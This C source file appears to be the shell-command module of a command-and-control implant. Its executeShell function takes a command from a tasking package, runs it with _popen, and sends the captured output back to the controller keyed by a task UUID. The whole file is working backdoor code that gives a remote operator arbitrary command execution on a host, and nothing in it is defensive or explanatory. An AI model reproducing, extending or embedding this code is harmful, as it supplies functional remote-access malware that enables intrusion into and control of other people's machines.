#include "Shell.h"

BOOL executeShell(PParser arguments)
{
	SIZE_T uuidLength = 36;
	PCHAR taskUuid = getString(arguments, &uuidLength);
	UINT32 nbArg = getInt32(arguments);
	SIZE_T size = 0;
	PCHAR cmd = getString(arguments, &size);
	cmd = (PCHAR)LocalReAlloc(cmd, size + 1, LMEM_MOVEABLE | LMEM_ZEROINIT);
	if (!cmd)
	{
		_err("[SHELL] Error in executeShell command");
		LocalFree(taskUuid);
		return FALSE;
	}

	FILE* fp;
	CHAR path[1035];

	// Create the response package
	PPackage responseTask = newPackage(POST_RESPONSE, TRUE);
	addString(responseTask, taskUuid, FALSE);

	// Temporary output to store the result
	PPackage output = newPackage(0, FALSE);

	fp = _popen(cmd, "rb");
	if (!fp)
	{
		_err("[SHELL] Error in executeShell command");

		// Cleanup memory
		freePackage(output);
		freePackage(responseTask);
		LocalFree(cmd);
		LocalFree(taskUuid);

		return FALSE;
	}
	while (fgets(path, sizeof(path), fp) != nullptr)
	{
		addString(output, path, FALSE);
	}

	addBytes(responseTask, (PBYTE)output->buffer, output->length, TRUE);

	_pclose(fp);

	// Cleanup memory
	freePackage(output);
	LocalFree(cmd);
	LocalFree(taskUuid);

	Parser* ResponseParser = sendPackage(responseTask);
	freeParser(ResponseParser);

	return TRUE;

}
